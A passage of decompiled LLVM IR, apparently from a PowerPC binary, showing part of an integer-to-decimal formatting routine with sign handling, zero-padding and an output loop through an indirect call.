  br i1 %v3_10010ad8, label %dec_label_pc_10010b08, label %dec_label_pc_10010ae0

dec_label_pc_10010ae0:                            ; preds = %dec_label_pc_10010ad8
  %v0_10010ae0 = load i32, i32* %r30.global-to-local, align 4
  %v1_10010ae0 = icmp slt i32 %v0_10010ae0, 0
  %v3_10010ae0 = icmp eq i32 %v0_10010ae0, 0
  store i1 %v1_10010ae0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010ae0, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_10010ae0, 1
  br i1 %tmp79, label %dec_label_pc_10010b08, label %dec_label_pc_10010ae8

dec_label_pc_10010ae8:                            ; preds = %dec_label_pc_10010ad0, %dec_label_pc_10010ac4, %dec_label_pc_10010ae0
  %v2_10010af0 = inttoptr i32 %v1_10010af0 to i32*
  store i32 112, i32* %v2_10010af0, align 4
  store i32 ptrtoint (i32* @global_var_10019f18.484 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10010afc = load i32, i32* @r8, align 4
  %v2_10010afc = add i32 %v1_10010afc, 8
  %v3_10010afc = inttoptr i32 %v2_10010afc to i32*
  store i32 ptrtoint (i32* @global_var_10019f18.484 to i32), i32* %v3_10010afc, align 4
  %v0_10010b00 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010b00 = load i32, i32* @r8, align 4
  %v2_10010b00 = add i32 %v1_10010b00, 4
  %v3_10010b00 = inttoptr i32 %v2_10010b00 to i32*
  store i32 %v0_10010b00, i32* %v3_10010b00, align 4
  %v0_10010b04 = load i32, i32* @r8, align 4
  %v1_10010b04 = add i32 %v0_10010b04, 12
  store i32 %v1_10010b04, i32* @r8, align 4
  br label %dec_label_pc_10010b08

dec_label_pc_10010b08:                            ; preds = %dec_label_pc_10010ae0, %dec_label_pc_10010ad8, %dec_label_pc_10010ae8
  %v1_10010b18 = phi i32 [ %v1_10010af0, %dec_label_pc_10010ae0 ], [ %v1_10010af0, %dec_label_pc_10010ad8 ], [ %v1_10010b04, %dec_label_pc_10010ae8 ]
  %v0_10010b08 = load i32, i32* %r10.global-to-local, align 4
  %v1_10010b08 = add i32 %v0_10010b08, 1
  store i32 %v1_10010b08, i32* %r10.global-to-local, align 4
  %v4_10010b08 = icmp eq i32 %v1_10010b08, 0
  br i1 %v4_10010b08, label %dec_label_pc_10010b30, label %dec_label_pc_10010b10

dec_label_pc_10010b10:                            ; preds = %dec_label_pc_10010b08
  %v1_10010b10 = sub i32 -1, %v0_10010b08
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10010b18 = add i32 %v1_10010b18, 4
  %v3_10010b18 = inttoptr i32 %v2_10010b18 to i32*
  store i32 %v1_10010b10, i32* %v3_10010b18, align 4
  store i32 ptrtoint (i32* @global_var_10019f0b.483 to i32), i32* %r9.global-to-local, align 4
  %v0_10010b24 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010b24 = load i32, i32* @r8, align 4
  %v2_10010b24 = inttoptr i32 %v1_10010b24 to i32*
  store i32 %v0_10010b24, i32* %v2_10010b24, align 4
  %v0_10010b28 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010b28 = load i32, i32* @r8, align 4
  %v2_10010b28 = add i32 %v1_10010b28, 8
  %v3_10010b28 = inttoptr i32 %v2_10010b28 to i32*
  store i32 %v0_10010b28, i32* %v3_10010b28, align 4
  %v0_10010b2c = load i32, i32* @r8, align 4
  %v1_10010b2c = add i32 %v0_10010b2c, 12
  store i32 %v1_10010b2c, i32* @r8, align 4
  br label %dec_label_pc_10010b30

dec_label_pc_10010b30:                            ; preds = %dec_label_pc_10010b08, %dec_label_pc_10010b10
  %v1_10010b3c = phi i32 [ %v1_10010b18, %dec_label_pc_10010b08 ], [ %v1_10010b2c, %dec_label_pc_10010b10 ]
  %v0_10010b30 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010b30 = icmp slt i32 %v0_10010b30, 0
  %v3_10010b30 = icmp eq i32 %v0_10010b30, 0
  store i1 %v1_10010b30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010b30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010b30, label %dec_label_pc_10010b4c, label %dec_label_pc_10010b38

dec_label_pc_10010b38:                            ; preds = %dec_label_pc_10010b30
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_10010b3c = load i32, i32* %r6.global-to-local, align 4
  %v2_10010b3c = add i32 %v1_10010b3c, 8
  %v3_10010b3c = inttoptr i32 %v2_10010b3c to i32*
  store i32 %v0_10010b3c, i32* %v3_10010b3c, align 4
  %v0_10010b40 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010b40 = load i32, i32* @r8, align 4
  %v2_10010b40 = inttoptr i32 %v1_10010b40 to i32*
  store i32 %v0_10010b40, i32* %v2_10010b40, align 4
  %v0_10010b44 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010b44 = load i32, i32* @r8, align 4
  %v2_10010b44 = add i32 %v1_10010b44, 4
  %v3_10010b44 = inttoptr i32 %v2_10010b44 to i32*
  store i32 %v0_10010b44, i32* %v3_10010b44, align 4
  %v0_10010b48 = load i32, i32* @r8, align 4
  %v1_10010b48 = add i32 %v0_10010b48, 12
  store i32 %v1_10010b48, i32* @r8, align 4
  br label %dec_label_pc_10010b4c

dec_label_pc_10010b4c:                            ; preds = %dec_label_pc_10010b30, %dec_label_pc_10010b38
  %v1_10010b74 = phi i32 [ %v1_10010b3c, %dec_label_pc_10010b30 ], [ %v1_10010b48, %dec_label_pc_10010b38 ]
  %v0_10010b4c = load i32, i32* %r31.global-to-local, align 4
  %v1_10010b4c = icmp slt i32 %v0_10010b4c, 103
  %v3_10010b4c = icmp eq i32 %v0_10010b4c, 103
  store i1 %v1_10010b4c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010b4c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010b4c, label %dec_label_pc_10010b54, label %dec_label_pc_10010b60

dec_label_pc_10010b54:                            ; preds = %dec_label_pc_10010b4c
  %v3_10010b54 = load i32, i32* %v2_10010694, align 4
  store i32 %v3_10010b54, i32* %r0.global-to-local, align 4
  %v1_10010b58 = and i32 %v3_10010b54, 16
  store i32 %v1_10010b58, i32* %r9.global-to-local, align 4
  %v3_10010b58 = icmp eq i32 %v1_10010b58, 0
  br i1 %v3_10010b58, label %dec_label_pc_10010b8c, label %dec_label_pc_10010b60

dec_label_pc_10010b60:                            ; preds = %dec_label_pc_10010b4c, %dec_label_pc_10010b54
  %v0_10010b60 = load i32, i32* %r10.global-to-local, align 4
  %v1_10010b60 = load i32, i32* %r11.global-to-local, align 4
  %v2_10010b60 = sub i32 %v1_10010b60, %v0_10010b60
  store i32 %v2_10010b60, i32* %r9.global-to-local, align 4
  %v1_10010b64 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010b64 = icmp sgt i32 %v1_10010b64, %v2_10010b60
  %v4_10010b64 = icmp eq i32 %v1_10010b64, %v2_10010b60
  store i1 %v2_10010b64, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10010b64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10010b64, label %dec_label_pc_10010b6c, label %dec_label_pc_10010b8c

dec_label_pc_10010b6c:                            ; preds = %dec_label_pc_10010b60
  %v2_10010b6c = sub i32 %v1_10010b64, %v2_10010b60
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10010b74 = add i32 %v1_10010b74, 4
  %v3_10010b74 = inttoptr i32 %v2_10010b74 to i32*
  store i32 %v2_10010b6c, i32* %v3_10010b74, align 4
  store i32 ptrtoint (i32* @global_var_10019f0b.483 to i32), i32* %r9.global-to-local, align 4
  %v0_10010b80 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010b80 = load i32, i32* @r8, align 4
  %v2_10010b80 = inttoptr i32 %v1_10010b80 to i32*
  store i32 %v0_10010b80, i32* %v2_10010b80, align 4
  %v0_10010b84 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010b84 = load i32, i32* @r8, align 4
  %v2_10010b84 = add i32 %v1_10010b84, 8
  %v3_10010b84 = inttoptr i32 %v2_10010b84 to i32*
  store i32 %v0_10010b84, i32* %v3_10010b84, align 4
  %v0_10010b88 = load i32, i32* @r8, align 4
  %v1_10010b88 = add i32 %v0_10010b88, 12
  store i32 %v1_10010b88, i32* @r8, align 4
  br label %dec_label_pc_10010b8c

dec_label_pc_10010b8c:                            ; preds = %dec_label_pc_10010b60, %dec_label_pc_10010b54, %dec_label_pc_10010b6c
  %v1_10010c2037 = phi i32 [ %v1_10010b74, %dec_label_pc_10010b60 ], [ %v1_10010b74, %dec_label_pc_10010b54 ], [ %v1_10010b88, %dec_label_pc_10010b6c ]
  %v0_10010b8c = load i32, i32* %r4.global-to-local, align 4
  %v1_10010b8c = icmp slt i32 %v0_10010b8c, 102
  %v3_10010b8c = icmp eq i32 %v0_10010b8c, 102
  store i1 %v1_10010b8c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010b8c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010b8c, label %dec_label_pc_10010c14, label %dec_label_pc_10010b94

dec_label_pc_10010b94:                            ; preds = %dec_label_pc_10010b8c
  %v0_10010b94 = load i32, i32* %r7.global-to-local, align 4
  %v1_10010b94 = icmp slt i32 %v0_10010b94, 0
  %v3_10010b94 = icmp eq i32 %v0_10010b94, 0
  store i1 %v1_10010b94, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010b94, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_10010b94, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_10010b94, -1
  br i1 %tmp80, label %dec_label_pc_10010bb0, label %dec_label_pc_10010ba8

dec_label_pc_10010ba8:                            ; preds = %dec_label_pc_10010b94
  %v1_10010ba8 = sub i32 0, %v0_10010b94
  store i32 %v1_10010ba8, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10010bb0

dec_label_pc_10010bb0:                            ; preds = %dec_label_pc_10010b94, %dec_label_pc_10010ba8
  %v0_10010bc431 = phi i32 [ %v0_10010b94, %dec_label_pc_10010b94 ], [ %v1_10010ba8, %dec_label_pc_10010ba8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10010bb4 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_10010bb4, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010bc4

dec_label_pc_10010bc4:                            ; preds = %dec_label_pc_10010bc4.backedge, %dec_label_pc_10010bb0
  %v2_10010be4 = phi i32 [ %v3_10010be4, %dec_label_pc_10010bc4.backedge ], [ %v2_10010bb4, %dec_label_pc_10010bb0 ]
  %v0_10010bc8 = phi i32 [ %v0_10010bc8.pre, %dec_label_pc_10010bc4.backedge ], [ 2, %dec_label_pc_10010bb0 ]
  %v1_10010bc4 = phi i32 [ %v1_10010bc4.pre, %dec_label_pc_10010bc4.backedge ], [ 10, %dec_label_pc_10010bb0 ]
  %v1_10010bd8 = phi i32 [ %v0_10010bc4.pre, %dec_label_pc_10010bc4.backedge ], [ %v0_10010bc431, %dec_label_pc_10010bb0 ]
  %v2_10010bc4 = sdiv i32 %v1_10010bd8, %v1_10010bc4
  store i32 %v2_10010bc4, i32* %r0.global-to-local, align 4
  %v1_10010bc8 = add i32 %v0_10010bc8, 1
  store i32 %v1_10010bc8, i32* %r7.global-to-local, align 4
  %v1_10010bcc = icmp slt i32 %v1_10010bc8, 3
  %v3_10010bcc = icmp eq i32 %v1_10010bc8, 3
  store i1 %v1_10010bcc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010bcc, i1* %cr7_eq.global-to-local, align 1
  %v1_10010bd4 = icmp slt i32 %v2_10010bc4, 0
  %v2_10010bd4 = icmp sgt i32 %v2_10010bc4, 0
  %v3_10010bd4 = icmp eq i32 %v2_10010bc4, 0
  store i1 %v1_10010bd4, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10010bd4, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10010bd4, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10010bc4, -10
  store i32 %v2_10010bc4, i32* %r11.global-to-local, align 4
  %v2_10010bd8 = add i32 %v1_10010bd8, 48
  %v1_10010be0 = add i32 %v2_10010bd8, %tmp81
  store i32 %v1_10010be0, i32* %r9.global-to-local, align 4
  %v1_10010be4 = trunc i32 %v1_10010be0 to i8
  %v3_10010be4 = add i32 %v2_10010be4, -1
  %v4_10010be4 = inttoptr i32 %v3_10010be4 to i8*
  store i8 %v1_10010be4, i8* %v4_10010be4, align 1
  store i32 %v3_10010be4, i32* %r10.global-to-local, align 4
  %v0_10010be8 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10010be8 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10010be8 = or i1 %v0_10010be8, %v1_10010be8
  br i1 %v2_10010be8, label %dec_label_pc_10010bc4.backedge, label %dec_label_pc_10010bec

dec_label_pc_10010bc4.backedge:                   ; preds = %dec_label_pc_10010bc4, %dec_label_pc_10010bec
  %v0_10010bc4.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10010bc4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_10010bc8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10010bc4

dec_label_pc_10010bec:                            ; preds = %dec_label_pc_10010bc4
  %v0_10010bec = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10010bec, label %dec_label_pc_10010bf0, label %dec_label_pc_10010bc4.backedge

dec_label_pc_10010bf0:                            ; preds = %dec_label_pc_10010bec
  %v1_10010bf0 = add i32 %v2_10010be4, -2
  store i32 %v1_10010bf0, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_10010bf8 = add i32 %v2_10010be4, -3
  store i32 %v1_10010bf8, i32* %r11.global-to-local, align 4
  %v0_10010bfc = load i32, i32* %r4.global-to-local, align 4
  %v1_10010bfc = trunc i32 %v0_10010bfc to i8
  %v4_10010bfc = inttoptr i32 %v1_10010bf0 to i8*
  store i8 %v1_10010bfc, i8* %v4_10010bfc, align 1
  %v0_10010c00 = load i32, i32* %r5.global-to-local, align 4
  %v1_10010c00 = trunc i32 %v0_10010c00 to i8
  %v2_10010c00 = load i32, i32* %r9.global-to-local, align 4
  %v3_10010c00 = add i32 %v2_10010c00, -1
  %v4_10010c00 = inttoptr i32 %v3_10010c00 to i8*
  store i8 %v1_10010c00, i8* %v4_10010c00, align 1
  %v0_10010c04 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010c04 = load i32, i32* @r8, align 4
  %v2_10010c04 = inttoptr i32 %v1_10010c04 to i32*
  store i32 %v0_10010c04, i32* %v2_10010c04, align 4
  %v0_10010c08 = load i32, i32* %r7.global-to-local, align 4
  %v1_10010c08 = load i32, i32* @r8, align 4
  %v2_10010c08 = add i32 %v1_10010c08, 4
  %v3_10010c08 = inttoptr i32 %v2_10010c08 to i32*
  store i32 %v0_10010c08, i32* %v3_10010c08, align 4
  %v0_10010c0c = load i32, i32* %r11.global-to-local, align 4
  %v1_10010c0c = load i32, i32* @r8, align 4
  %v2_10010c0c = add i32 %v1_10010c0c, 8
  %v3_10010c0c = inttoptr i32 %v2_10010c0c to i32*
  store i32 %v0_10010c0c, i32* %v3_10010c0c, align 4
  %v0_10010c10 = load i32, i32* @r8, align 4
  %v1_10010c10 = add i32 %v0_10010c10, 12
  store i32 %v1_10010c10, i32* @r8, align 4
  br label %dec_label_pc_10010c14

dec_label_pc_10010c14:                            ; preds = %dec_label_pc_10010b8c, %dec_label_pc_10010768, %dec_label_pc_10010bf0
  %v0_10010c90 = phi i32 [ %v1_10010c2037, %dec_label_pc_10010b8c ], [ %v2_10010774, %dec_label_pc_10010768 ], [ %v1_10010c10, %dec_label_pc_10010bf0 ]
  %v2_10010c14 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_10010c14, i32* %r9.global-to-local, align 4
  %v1_10010c24.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10010c18

dec_label_pc_10010c18:                            ; preds = %dec_label_pc_10010c18, %dec_label_pc_10010c14
  %v1_10010c24 = phi i32 [ %v2_10010c24, %dec_label_pc_10010c18 ], [ %v1_10010c24.pre, %dec_label_pc_10010c14 ]
  %v0_10010c18 = phi i32 [ %v1_10010c1c, %dec_label_pc_10010c18 ], [ %v2_10010c14, %dec_label_pc_10010c14 ]
  %v1_10010c18 = inttoptr i32 %v0_10010c18 to i32*
  %v2_10010c18 = load i32, i32* %v1_10010c18, align 4
  store i32 %v2_10010c18, i32* %r0.global-to-local, align 4
  %v1_10010c1c = add i32 %v0_10010c18, 12
  store i32 %v1_10010c1c, i32* %r9.global-to-local, align 4
  %v2_10010c20 = icmp ult i32 %v1_10010c1c, %v0_10010c90
  %v2_10010c24 = sub i32 %v1_10010c24, %v2_10010c18
  store i32 %v2_10010c24, i32* @r28, align 4
  br i1 %v2_10010c20, label %dec_label_pc_10010c18, label %dec_label_pc_10010c2c

dec_label_pc_10010c2c:                            ; preds = %dec_label_pc_10010c18
  %v4_10010c20 = icmp eq i32 %v1_10010c1c, %v0_10010c90
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10010c20, i1* %cr7_eq.global-to-local, align 1
  %v3_10010c2c = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* @r10, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10010c90, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_10010c2c, 0
  %v1_10010c40 = zext i1 %tmp85 to i32
  store i32 %v1_10010c40, i32* %r9.global-to-local, align 4
  %v2_10010c44 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_10010c44, i32* %r0.global-to-local, align 4
  %v2_10010c48 = sub i32 %v2_10010c24, %v1_10010c40
  store i32 %v2_10010c48, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_10010c48, 1
  br i1 %tmp82, label %dec_label_pc_10010cb4, label %dec_label_pc_10010c58

dec_label_pc_10010c58:                            ; preds = %dec_label_pc_10010c2c
  %v3_10010c58 = load i32, i32* %v2_10010694, align 4
  store i32 %v3_10010c58, i32* %r0.global-to-local, align 4
  %v1_10010c5c = and i32 %v3_10010c58, 8
  store i32 %v1_10010c5c, i32* %r7.global-to-local, align 4
  %v3_10010c5c = icmp eq i32 %v1_10010c5c, 0
  br i1 %v3_10010c5c, label %dec_label_pc_10010c80, label %dec_label_pc_10010c64

dec_label_pc_10010c64:                            ; preds = %dec_label_pc_10010c58
  %v1_10010c68 = add i32 %v0_10010c90, 12
  store i32 %v1_10010c68, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10019f0b.483 to i32), i32* %r9.global-to-local, align 4
  %v2_10010c70 = inttoptr i32 %v0_10010c90 to i32*
  store i32 160, i32* %v2_10010c70, align 4
  %v0_10010c74 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010c74 = load i32, i32* @r8, align 4
  %v2_10010c74 = add i32 %v1_10010c74, 4
  %v3_10010c74 = inttoptr i32 %v2_10010c74 to i32*
  store i32 %v0_10010c74, i32* %v3_10010c74, align 4
  %v0_10010c78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010c78 = load i32, i32* @r8, align 4
  %v2_10010c78 = add i32 %v1_10010c78, 8
  %v3_10010c78 = inttoptr i32 %v2_10010c78 to i32*
  store i32 %v0_10010c78, i32* %v3_10010c78, align 4
  br label %dec_label_pc_10010cb4

dec_label_pc_10010c80:                            ; preds = %dec_label_pc_10010c58
  %v1_10010c80 = add i32 %tmp, 16
  %v2_10010c80 = inttoptr i32 %v1_10010c80 to i32*
  %v3_10010c80 = load i32, i32* %v2_10010c80, align 4
  store i32 %v3_10010c80, i32* %r0.global-to-local, align 4
  %v1_10010c84 = icmp slt i32 %v3_10010c80, 48
  %v3_10010c84 = icmp eq i32 %v3_10010c80, 48
  store i1 %v1_10010c84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010c84, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010c84, label %dec_label_pc_10010c8c, label %dec_label_pc_10010ca8

dec_label_pc_10010c8c:                            ; preds = %dec_label_pc_10010c80
  %v3_10010c8c = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10010c90, i32* @r30, align 4
  %v2_10010c94 = add i32 %v3_10010c8c, %v2_10010c48
  store i32 %v2_10010c94, i32* %r0.global-to-local, align 4
  store i32 %v2_10010c94, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10010cb4

dec_label_pc_10010ca0:                            ; preds = %dec_label_pc_10010cbc
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_10010cf0

dec_label_pc_10010ca8:                            ; preds = %dec_label_pc_10010c80
  store i32 %v2_10010c24, i32* %r0.global-to-local, align 4
  store i32 %v0_10010c90, i32* @r30, align 4
  br label %dec_label_pc_10010cb4

dec_label_pc_10010cb4:                            ; preds = %dec_label_pc_10010c2c, %dec_label_pc_10010c8c, %dec_label_pc_10010c64, %dec_label_pc_10010ca8
  store i32 0, i32* @r29, align 4
  %v2_10010cb8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_10010cb8, i32* @r31, align 4
  br label %dec_label_pc_10010cbc

dec_label_pc_10010cbc:                            ; preds = %dec_label_pc_10010cec, %dec_label_pc_10010cb4
  %v0_10010ccc = phi i32 [ %v1_10010cd8, %dec_label_pc_10010cec ], [ %v2_10010cb8, %dec_label_pc_10010cb4 ]
  %v1_10010cbc = inttoptr i32 %v0_10010ccc to i32*
  %v2_10010cbc = load i32, i32* %v1_10010cbc, align 4
  store i32 %v2_10010cbc, i32* %r4.global-to-local, align 4
  %v0_10010cc0 = load i32, i32* @r27, align 4
  store i32 %v0_10010cc0, i32* %r3.global-to-local, align 4
  %v1_10010cc4 = add i32 %v0_10010ccc, 4
  %v2_10010cc4 = inttoptr i32 %v1_10010cc4 to i32*
  %v3_10010cc4 = load i32, i32* %v2_10010cc4, align 4
  store i32 %v3_10010cc4, i32* %r5.global-to-local, align 4
  %v0_10010cc8 = load i32, i32* @r26, align 4
  store i32 %v0_10010cc8, i32* %ctr.global-to-local, align 4
  %v1_10010ccc = add i32 %v0_10010ccc, 8
  %v2_10010ccc = inttoptr i32 %v1_10010ccc to i32*
  %v3_10010ccc = load i32, i32* %v2_10010ccc, align 4
  store i32 %v3_10010ccc, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10010cc8)
  %v0_10010cd4 = load i32, i32* @r31, align 4
  %v1_10010cd4 = add i32 %v0_10010cd4, 4
  %v2_10010cd4 = inttoptr i32 %v1_10010cd4 to i32*
  %v3_10010cd4 = load i32, i32* %v2_10010cd4, align 4
  store i32 %v3_10010cd4, i32* %r0.global-to-local, align 4
  %v1_10010cd8 = add i32 %v0_10010cd4, 12
  store i32 %v1_10010cd8, i32* @r31, align 4
  %v0_10010cdc = load i32, i32* @r29, align 4
  %v1_10010cdc = load i32, i32* %r3.global-to-local, align 4
  %v2_10010cdc = add i32 %v1_10010cdc, %v0_10010cdc
  store i32 %v2_10010cdc, i32* @r29, align 4
  %v2_10010ce0 = icmp slt i32 %v1_10010cdc, %v3_10010cd4
  %v4_10010ce0 = icmp eq i32 %v1_10010cdc, %v3_10010cd4
  store i1 %v2_10010ce0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10010ce0, i1* %cr7_eq.global-to-local, align 1
  %v1_10010ce4 = load i32, i32* @r30, align 4
  %v2_10010ce4 = icmp ult i32 %v1_10010cd8, %v1_10010ce4
  %v3_10010ce4 = icmp ugt i32 %v1_10010cd8, %v1_10010ce4
  %v4_10010ce4 = icmp eq i32 %v1_10010cd8, %v1_10010ce4
  store i1 %v2_10010ce4, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10010ce4, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10010ce4, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10010ce0, label %dec_label_pc_10010cec, label %dec_label_pc_10010ca0

dec_label_pc_10010cec:                            ; preds = %dec_label_pc_10010cbc
  br i1 %v2_10010ce4, label %dec_label_pc_10010cbc, label %dec_label_pc_10010cf0

dec_label_pc_10010cf0:                            ; preds = %dec_label_pc_10010cec, %dec_label_pc_10010ca0
  %v0_10010cf4 = phi i32 [ -1, %dec_label_pc_10010ca0 ], [ %v2_10010cdc, %dec_label_pc_10010cec ]
  store i32 %v0_10010644, i32* %r0.global-to-local, align 4
  store i32 %v0_10010cf4, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010cf4

; uselistorder directives
  uselistorder i32 %v0_10010cf4, { 1, 0 }
  uselistorder i32 %v1_10010cdc, { 2, 1, 0 }
  uselistorder i32 %v1_10010cd8, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_10010cd4, { 1, 0, 2 }
  uselistorder i32 %v0_10010ccc, { 0, 2, 1 }
  uselistorder i32 %v3_10010c80, { 1, 0, 2 }
  uselistorder i32 %v1_10010c40, { 1, 0 }
  uselistorder i32 %v2_10010c24, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10010c1c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10010c18, { 1, 0 }
  uselistorder i32 %v0_10010c90, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_10010be4, { 1, 2, 0 }
  uselistorder i32 %v1_10010bc8, { 1, 0, 2 }
  uselistorder i32 %v2_10010bc4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_10010b94, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_10010b64, { 2, 0, 1 }
  uselistorder i32 %v2_10010b60, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10010ad0, { 1, 0 }
  uselistorder i32 %v2_10010a34, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10010a08, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_100109d0, { 3, 0, 1, 2 }
  uselistorder i32 %v0_100109c8, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10010994, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10010984, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_10010978, { 1, 0, 2 }
  uselistorder i32 %v1_1001095c, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10010914, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10010904, { 1, 0, 3, 2 }
  uselistorder i32 %v1_100108e8, { 1, 0 }
  uselistorder i32 %v1_100108c4, { 1, 0 }
  uselistorder i32 %v2_100108a4, { 1, 0, 2 }
  uselistorder i32 %v0_1001084c, { 1, 0 }
  uselistorder i32 %v1_100106b0, { 1, 0 }
  uselistorder i32 %v0_1001073c, { 2, 1, 0 }
  uselistorder i32 %v1_10010684, { 1, 0 }
  uselistorder i32 %v1_10010664, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 2, 4, 1, 3, 0, 5, 6 }
  uselistorder i32* %r9.global-to-local, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %r8.global-to-local, { 5, 3, 6, 7, 4, 9, 8, 10, 0, 1, 2 }
  uselistorder i32* %r7.global-to-local, { 4, 6, 5, 7, 8, 11, 10, 12, 9, 13, 0, 1, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 4, 5, 6, 8, 7, 9, 0, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 3, 5, 4, 6, 9, 7, 10, 8, 11, 12, 13, 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 3, 4, 5, 6, 7, 1, 0, 2 }
  uselistorder i32* %r30.global-to-local, { 6, 7, 5, 2, 8, 3, 1, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 13, 14, 9, 10, 11, 15, 18, 16, 19, 17, 20, 21, 22, 0 }
  uselistorder i32* %r10.global-to-local, { 4, 5, 6, 7, 12, 8, 9, 10, 13, 11, 14, 17, 15, 16, 18, 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 27, 24, 25, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 2, 3, 4, 5, 0, 6, 7, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 3, 0, 1, 2 }
